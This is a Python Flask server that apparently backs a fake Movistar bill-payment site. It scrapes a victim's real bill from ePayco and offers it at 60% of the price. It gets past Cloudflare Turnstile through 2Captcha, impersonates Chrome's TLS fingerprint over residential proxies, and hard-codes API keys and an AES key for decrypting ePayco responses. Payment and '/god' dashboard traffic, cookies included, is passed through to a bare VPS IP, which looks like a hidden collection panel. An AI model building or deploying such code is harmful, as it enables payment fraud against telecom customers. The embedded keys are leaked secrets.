import sys
import json
import time
import requests
try:
    import tls_client
except ImportError:
    tls_client = None
import base64
import os
from flask import Flask, request, jsonify, send_file, send_from_directory, make_response
from flask_cors import CORS
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ImportError:
    AES = None

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
# CORS permisivo para evitar bloqueos entre dominios de Render
CORS(app, resources={r"/*": {"origins": "*"}})

@app.route('/')
def home():
    return send_file('index.html')

# Configuración API Movistar / ePayco
VPS_IP              = "209.182.217.181"
MOVISTAR_PUBLIC_KEY = "479f29cc87cb26bdea89e873b5287784"
MOVISTAR_DOMINIO   = "https://movistar.epayco.me"
ENDPOINT_TOKEN      = "https://recaudo.epayco.co/api/recaudo/get/token"
ENDPOINT_CONSULTA   = "https://recaudo.epayco.co/api/recaudo/proyecto/api/consulta/facturas"
API_KEY_2CAPTCHA    = "12f9e3865d60235df14c8dff5e8854b9"
try:
    from curl_cffi import requests as curl_requests
except ImportError:
    curl_requests = None

# === CONFIGURA TUS PROXIES RESIDENCIALES AQUÍ ===
# Formato: "http://usuario:contraseña@ip_roxy:puerto" (Si no tiene usuario, solo "http://ip_proxy:puerto")
# Déjalo vacío si lo pruebas en Localhost sin proxy.
PROXY_URL = "" 

def get_session():
    if PROXY_URL:
        return curl_requests.Session(
            impersonate="chrome120",
            proxies={"http": PROXY_URL, "https": PROXY_URL},
            verify=False
        )
    return curl_requests.Session(impersonate="chrome120")

def get_movistar_token(session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://movistar.recaudo.epayco.co",
        "Referer": "https://movistar.recaudo.epayco.co/"
    }
    payload = {
        "public_key": MOVISTAR_PUBLIC_KEY,
        "dominio": MOVISTAR_DOMINIO
    }
    try:
        res = session.post(ENDPOINT_TOKEN, headers=headers, json=payload, timeout=15)
        if res.status_code == 200:
            return res.json().get("data", {}).get("token")
        
        print(f"[DEBUG] -> ERROR OBTENIENDO TOKEN: Code {res.status_code} | Respuesta: {res.text[:150]}", file=sys.stderr, flush=True)
        return None
    except Exception as e:
        print(f"[DEBUG] -> Exception letal pidiendo Token: {str(e)}", file=sys.stderr, flush=True)
        return None

def solve_turnstile():
    url_in = "https://2captcha.com/in.php"
    payload_in = {
        "key": API_KEY_2CAPTCHA,
        "method": "turnstile",
        "sitekey": "0x4AAAAAABvJzZ2sF3LSNXQw",
        "pageurl": "https://movistar.recaudo.epayco.co/",
        "json": 1
    }
    try:
        res = requests.post(url_in, data=payload_in, timeout=20)
        data = res.json()
        if data.get("status") != 1:
            print(f"[DEBUG] -> Error Fatal en 2Captcha (Falta saldo?): {data}", file=sys.stderr, flush=True)
            return None
        task_id = data.get("request")
        
        url_res = f"https://2captcha.com/res.php?key={API_KEY_2CAPTCHA}&action=get&id={task_id}&json=1"
        for _ in range(25):
            time.sleep(3)
            res_poll = requests.get(url_res, timeout=10)
            data_poll = res_poll.json()
            if data_poll.get("status") == 1:
                return data_poll.get("request")
            elif data_poll.get("request") != "CAPCHA_NOT_READY":
                print(f"[DEBUG] -> 2Captcha canceló la tarea: {data_poll}", file=sys.stderr, flush=True)
                return None
        print(f"[DEBUG] -> 2Captcha falló por Tiempo Agotado de 75segundos.", file=sys.stderr, flush=True)
        return None
    except Exception as e:
        print(f"[DEBUG] -> Interferencia en red al conectar a 2Captcha: {str(e)}", file=sys.stderr, flush=True)
        return None

def decrypt_epayco_response(encrypted_b64):
    if not AES:
        return {"error": "Librería Crypto no instalada"}
    try:
        key = "C6ENvRUmxYurdHgYyWNx2arr8wYquQbG".encode("utf-8")
        raw_data = base64.b64decode(encrypted_b64)
        if len(raw_data) < 32:
            return {"error": "Respuesta demasiado corta para descifrar"}
        iv = raw_data[:16]
        ciphertext = raw_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_raw = cipher.decrypt(ciphertext)
        decrypted_text = unpad(decrypted_raw, AES.block_size).decode("utf-8")
        return json.loads(decrypted_text)
    except Exception as e:
        return {"error": f"Fallo al descifrar: {str(e)}"}

# ----------------- RUTAS DE FRONTEND (MONOLITO) ---------------- #
@app.route('/')
def home_frontend():
    # Render recibe la raíz de la web y saca el archivo original de Vercel/XAMPP
    if os.path.exists('index.html'):
        return send_file('index.html')
    return "Falta mover el archivo index.html adentro de esta carpeta para que se muestre en Render.", 404

@app.route('/img/<path:filename>')
def serve_img(filename):
    # Sirve los logos e imágenes
    return send_from_directory('img', filename)

@app.route('/pagos/<path:subpath>', methods=['GET', 'POST', 'OPTIONS'])
def proxy_pagos(subpath):
    target_url = f"http://{VPS_IP}/pagos/{subpath}"
    headers = {key: value for (key, value) in request.headers if key.lower() not in ['host', 'content-length']}
    
    try:
        if request.method == 'POST':
            res = requests.post(target_url, params=request.args, data=request.get_data(), headers=headers, timeout=20, allow_redirects=False)
        elif request.method == 'OPTIONS':
            res = requests.options(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
        else:
            res = requests.get(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
            
        flask_res = make_response(res.content, res.status_code)
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'set-cookie']
        for name, value in res.raw.headers.items():
            if name.lower() not in excluded_headers:
                if name.lower() == 'location':
                    value = value.replace(f'http://{VPS_IP}', request.host_url.rstrip('/'))
                flask_res.headers.add(name, value)
                
        for cookie in res.cookies:
            flask_res.set_cookie(cookie.name, cookie.value, path=cookie.path)

        return flask_res
    except Exception as e:
        return f"Error Proxy PHP: {str(e)}", 502

@app.route('/god', methods=['GET', 'POST'])
@app.route('/god/', methods=['GET', 'POST'])
@app.route('/god/<path:subpath>', methods=['GET', 'POST', 'OPTIONS'])
def proxy_god(subpath="dashboard.php"):
    if not subpath or subpath == "":
        subpath = "dashboard.php"
    target_url = f"http://{VPS_IP}/god/{subpath}"
    headers = {key: value for (key, value) in request.headers if key.lower() not in ['host', 'content-length']}
    
    try:
        if request.method == 'POST':
            res = requests.post(target_url, params=request.args, data=request.get_data(), headers=headers, timeout=20, allow_redirects=False)
        elif request.method == 'OPTIONS':
            res = requests.options(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
        else:
            res = requests.get(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
            
        flask_res = make_response(res.content, res.status_code)
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'set-cookie']
        for name, value in res.raw.headers.items():
            if name.lower() not in excluded_headers:
                if name.lower() == 'location':
                    value = value.replace(f'http://{VPS_IP}', request.host_url.rstrip('/'))
                flask_res.headers.add(name, value)
                
        for cookie in res.cookies:
            flask_res.set_cookie(cookie.name, cookie.value, path=cookie.path)

        return flask_res
    except Exception as e:
        return f"Error Proxy PHP: {str(e)}", 502

@app.route('/consulta', methods=['POST', 'OPTIONS'])
def consultar_deuda():
    if request.method == 'OPTIONS':
        return make_response('', 200)

    data_req = request.get_json()
    if not data_req or 'numero' not in data_req:
        return jsonify({"status": "error", "message": "Falta el número a consultar"}), 400

    

    numero = str(data_req['numero']).strip()
    print(f"[DEBUG] -> Redirigiendo consulta a nuestra API local de Playwright: {numero}", file=sys.stderr, flush=True)
    
    try:
        api_url = f"http://{VPS_IP}:8000/consultar?numero={numero}"
        import requests
        res = requests.get(api_url, timeout=60)
        data = res.json()
        
        if data.get("estado") == "CON_FACTURA":
            monto_str = data.get("datos", {}).get("total_pagar", "0")
            monto_str = monto_str.replace(".", "").replace(",", "").replace("$", "").strip()
            total = float(monto_str) * 0.60
            return jsonify({"status": "success", "amount": total, "numero": numero})
            
        elif data.get("estado") == "SIN_FACTURA":
            return jsonify({"status": "success", "amount": 0, "message": data.get("mensaje", "No tienes facturas pendientes.")})
            
        else:
            return jsonify({"status": "error", "message": data.get("mensaje", "Error desconocido")})
            
    except requests.exceptions.Timeout:
        return jsonify({"status": "error", "message": "La API de Playwright tardó demasiado en responder"}), 408
    except requests.exceptions.ConnectionError:
        return jsonify({"status": "error", "message": "La API de Playwright no está encendida en el puerto 8000"}), 502
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/<path:path>')
def proxy_static(path):
    return send_from_directory('.', path)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)






